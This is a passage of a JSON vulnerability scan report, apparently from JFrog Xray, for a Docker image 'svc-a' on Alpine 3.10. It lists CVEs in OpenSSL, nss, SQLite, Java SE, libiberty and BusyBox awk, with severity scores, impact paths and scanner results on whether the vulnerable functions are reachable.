                                "description": "Even though a public DoS exploit has existed since 2021, no public exploit or technical writeup ever demonstrated remote code execution using this vulnerability. Considering the old age of this vulnerability, it is likely to assume that achieving RCE is extremely difficult.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "cve_id": "CVE-2021-43527",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the vulnerable functions are called -</p>\n<ul>\n<li><code>CERT_VerifyCertificate</code></li>\n<li><code>CERT_VerifyCertificateNow</code></li>\n<li><code>CERT_VerifyCert</code></li>\n<li><code>CERT_VerifyCertNow</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "vulnerability_id": "CVE-2021-43527",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-588972",
                    "summary": "Heap/stack buffer overflow in the dlang_lname function in d-demangle.c in libiberty allows attackers to potentially cause a denial of service (segmentation fault and crash) via a crafted mangled symbol.",
                    "description": "Heap/stack buffer overflow in the dlang_lname function in d-demangle.c in libiberty allows attackers to potentially cause a denial of service (segmentation fault and crash) via a crafted mangled symbol.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-3826",
                            "cwe": [
                                "CWE-119"
                            ],
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-01-22T00:00:00.050Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-3826",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607987",
                    "summary": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
                    "description": "Issue summary: Processing some specially crafted ASN.1 object identifiers or\ndata containing them may be very slow.\n\nImpact summary: Applications that use OBJ_obj2txt() directly, or use any of\nthe OpenSSL subsystems OCSP, PKCS7/SMIME, CMS, CMP/CRMF or TS with no message\nsize limit may experience notable to very long delays when processing those\nmessages, which may lead to a Denial of Service.\n\nAn OBJECT IDENTIFIER is composed of a series of numbers - sub-identifiers -\nmost of which have no size limit.  OBJ_obj2txt() may be used to translate\nan ASN.1 OBJECT IDENTIFIER given in DER encoding form (using the OpenSSL\ntype ASN1_OBJECT) to its canonical numeric text form, which are the\nsub-identifiers of the OBJECT IDENTIFIER in decimal form, separated by\nperiods.\n\nWhen one of the sub-identifiers in the OBJECT IDENTIFIER is very large\n(these are sizes that are seen as absurdly large, taking up tens or hundreds\nof KiBs), the translation to a decimal number in text may take a very long\ntime.  The time complexity is O(n^2) with 'n' being the size of the\nsub-identifiers in bytes (*).\n\nWith OpenSSL 3.0, support to fetch cryptographic algorithms using names /\nidentifiers in string form was introduced.  This includes using OBJECT\nIDENTIFIERs in canonical numeric text form as identifiers for fetching\nalgorithms.\n\nSuch OBJECT IDENTIFIERs may be received through the ASN.1 structure\nAlgorithmIdentifier, which is commonly used in multiple protocols to specify\nwhat cryptographic algorithm should be used to sign or verify, encrypt or\ndecrypt, or digest passed data.\n\nApplications that call OBJ_obj2txt() directly with untrusted data are\naffected, with any version of OpenSSL.  If the use is for the mere purpose\nof display, the severity is considered low.\n\nIn OpenSSL 3.0 and newer, this affects the subsystems OCSP, PKCS7/SMIME,\nCMS, CMP/CRMF or TS.  It also impacts anything that processes X.509\ncertificates, including simple things like verifying its signature.\n\nThe impact on TLS is relatively low, because all versions of OpenSSL...",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-2650",
                            "cwe": [
                                "CWE-770"
                            ],
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-2650",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether one of the following function is called with an external input:</p>\n<ul>\n<li>Direct call to <code>OBJ_obj2txt()</code> function (for OpenSSL 1.x and OpenSSL 3.x)</li>\n</ul>\n<p><strong>Only for OpenSSL 3.x:</strong></p>\n<ul>\n<li>\n<p>OCSP: <code>OCSP_basic_verify()</code></p>\n</li>\n<li>\n<p>PKCS7/SMIME:<br />\n<code>PKCS7_decrypt()</code><br />\n<code>PKCS7_sign()</code><br />\n<code>PKCS7_verify()</code></p>\n</li>\n<li>\n<p>CMS:<br />\n<code>CMS_EncryptedData_decrypt()</code><br />\n<code>CMS_EncryptedData_encrypt()</code><br />\n<code>CMS_EnvelopedData_decrypt()</code><br />\n<code>CMS_final()</code><br />\n<code>CMS_decrypt_set1_password()</code><br />\n<code>CMS_RecipientInfo_decrypt()</code><br />\n<code>CMS_decrypt()</code><br />\n<code>CMS_decrypt_set1_pkey()</code><br />\n<code>CMS_decrypt_set1_pkey_and_peer()</code><br />\n<code>CMS_SignedData_verify()</code><br />\n<code>CMS_verify()</code><br />\n<code>CMS_SignerInfo_verify()</code><br />\n<code>CMS_compress()</code><br />\n<code>CMS_data_create()</code><br />\n<code>CMS_data_create_ex()</code><br />\n<code>CMS_digest_create()</code><br />\n<code>CMS_digest_create_ex()</code><br />\n<code>CMS_digest_verify()</code><br />\n<code>CMS_encrypt()</code><br />\n<code>CMS_encrypt_ex()</code><br />\n<code>CMS_final_digest()</code><br />\n<code>CMS_sign()</code><br />\n<code>CMS_sign_ex()</code><br />\n<code>CMS_add1_signer()</code><br />\n<code>CMS_sign_receipt()</code><br />\n<code>CMS_uncompress()</code><br />\n<code>CMS_verify_receipt()</code></p>\n</li>\n<li>\n<p>CMP/CRMF:<br />\n<code>OSSL_CMP_get_caCerts()</code><br />\n<code>OSSL_CRMF_ENCRYPTEDVALUE_get1_encCert()</code><br />\n<code>OSSL_CRMF_pbm_new()</code></p>\n</li>\n<li>\n<p>TS:<br />\n<code>TS_REQ_print_bio()</code><br />\n<code>TS_OBJ_print_bio()</code><br />\n<code>TS_RESP_create_response()</code><br />\n<code>TS_RESP_print_bio()</code><br />\n<code>TS_RESP_verify_response()</code><br />\n<code>TS_RESP_verify_token()</code></p>\n</li>\n<li>\n<p>ASN1:<br />\n<code>ASN1_parse()</code><br />\n<code>X509_NAME_print_ex()</code><br />\n<code>X509_NAME_print_ex_fp()</code><br />\n<code>d2i_AutoPrivateKey()</code><br />\n<code>d2i_PrivateKey()</code><br />\n<code>X509_STORE_CTX_print_verify_cb()</code><br />\n<code>x509_pubkey_ex_d2i_ex()</code></p>\n</li>\n<li>\n<p>EVP:<br />\n<code>EVP_PKCS82PKEY()</code><br />\n<code>EVP_PKCS82PKEY_ex()</code><br />\n<code>PKCS5_v2_PBE_keyivgen()</code><br />\n<code>PKCS5_v2_PBE_keyivgen_ex()</code></p>\n</li>\n<li>\n<p>ESS:<br />\n<code>OSSL_ESS_check_signing_certs()</code></p>\n</li>\n</ul>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "The vulnerable functions of OpenSSL are not called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-2650",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether one of the following function is called with an external input:</p>\n<ul>\n<li>Direct call to <code>OBJ_obj2txt()</code> function (for OpenSSL 1.x and OpenSSL 3.x)</li>\n</ul>\n<p><strong>Only for OpenSSL 3.x:</strong></p>\n<ul>\n<li>\n<p>OCSP: <code>OCSP_basic_verify()</code></p>\n</li>\n<li>\n<p>PKCS7/SMIME:<br />\n<code>PKCS7_decrypt()</code><br />\n<code>PKCS7_sign()</code><br />\n<code>PKCS7_verify()</code></p>\n</li>\n<li>\n<p>CMS:<br />\n<code>CMS_EncryptedData_decrypt()</code><br />\n<code>CMS_EncryptedData_encrypt()</code><br />\n<code>CMS_EnvelopedData_decrypt()</code><br />\n<code>CMS_final()</code><br />\n<code>CMS_decrypt_set1_password()</code><br />\n<code>CMS_RecipientInfo_decrypt()</code><br />\n<code>CMS_decrypt()</code><br />\n<code>CMS_decrypt_set1_pkey()</code><br />\n<code>CMS_decrypt_set1_pkey_and_peer()</code><br />\n<code>CMS_SignedData_verify()</code><br />\n<code>CMS_verify()</code><br />\n<code>CMS_SignerInfo_verify()</code><br />\n<code>CMS_compress()</code><br />\n<code>CMS_data_create()</code><br />\n<code>CMS_data_create_ex()</code><br />\n<code>CMS_digest_create()</code><br />\n<code>CMS_digest_create_ex()</code><br />\n<code>CMS_digest_verify()</code><br />\n<code>CMS_encrypt()</code><br />\n<code>CMS_encrypt_ex()</code><br />\n<code>CMS_final_digest()</code><br />\n<code>CMS_sign()</code><br />\n<code>CMS_sign_ex()</code><br />\n<code>CMS_add1_signer()</code><br />\n<code>CMS_sign_receipt()</code><br />\n<code>CMS_uncompress()</code><br />\n<code>CMS_verify_receipt()</code></p>\n</li>\n<li>\n<p>CMP/CRMF:<br />\n<code>OSSL_CMP_get_caCerts()</code><br />\n<code>OSSL_CRMF_ENCRYPTEDVALUE_get1_encCert()</code><br />\n<code>OSSL_CRMF_pbm_new()</code></p>\n</li>\n<li>\n<p>TS:<br />\n<code>TS_REQ_print_bio()</code><br />\n<code>TS_OBJ_print_bio()</code><br />\n<code>TS_RESP_create_response()</code><br />\n<code>TS_RESP_print_bio()</code><br />\n<code>TS_RESP_verify_response()</code><br />\n<code>TS_RESP_verify_token()</code></p>\n</li>\n<li>\n<p>ASN1:<br />\n<code>ASN1_parse()</code><br />\n<code>X509_NAME_print_ex()</code><br />\n<code>X509_NAME_print_ex_fp()</code><br />\n<code>d2i_AutoPrivateKey()</code><br />\n<code>d2i_PrivateKey()</code><br />\n<code>X509_STORE_CTX_print_verify_cb()</code><br />\n<code>x509_pubkey_ex_d2i_ex()</code></p>\n</li>\n<li>\n<p>EVP:<br />\n<code>EVP_PKCS82PKEY()</code><br />\n<code>EVP_PKCS82PKEY_ex()</code><br />\n<code>PKCS5_v2_PBE_keyivgen()</code><br />\n<code>PKCS5_v2_PBE_keyivgen_ex()</code></p>\n</li>\n<li>\n<p>ESS:<br />\n<code>OSSL_ESS_check_signing_certs()</code></p>\n</li>\n</ul>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "The vulnerable functions of OpenSSL are not called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-2650",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-2650",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-711218",
                    "summary": "There exists a vulnerability in SQLite versions before 3.50.2 where the number of aggregate terms could exceed the number of columns available. This could lead to a memory corruption issue. We recommend upgrading to version 3.50.2 or above.",
                    "description": "There exists a vulnerability in SQLite versions before 3.50.2 where the number of aggregate terms could exceed the number of columns available. This could lead to a memory corruption issue. We recommend upgrading to version 3.50.2 or above.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-6965",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2025-07-20T00:00:00.244Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-6965",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-126959",
                    "summary": "When converting coordinates from projective to affine, the modular inversion was not performed in constant time, resulting in a possible timing-based side channel attack. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "description": "When converting coordinates from projective to affine, the modular inversion was not performed in constant time, resulting in a possible timing-based side channel attack. This vulnerability affects Firefox < 80 and Firefox for Android < 80.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-12400",
                            "cwe": [
                                "CWE-203"
                            ],
                            "cvss_v2": "1.2/CVSS:2.0/AV:L/AC:H/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "4.7/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2020-10-20T00:00:00.158Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-12400",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180062",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-2341",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N"
                        }
                    ],
                    "created": "2021-07-22T00:00:00.805Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-2341",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190230",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42380",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.907Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in `awk` leads to denial of service and possibly code execution when processing a crafted awk pattern in the `clrvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42380",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42380",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42380",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42380",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-413867",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization).  Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf; Oracle GraalVM Enterprise Edition: 20.3.8 and  21.3.4. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization).  Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf; Oracle GraalVM Enterprise Edition: 20.3.8 and  21.3.4. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21830",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-01-19T00:00:00.934Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
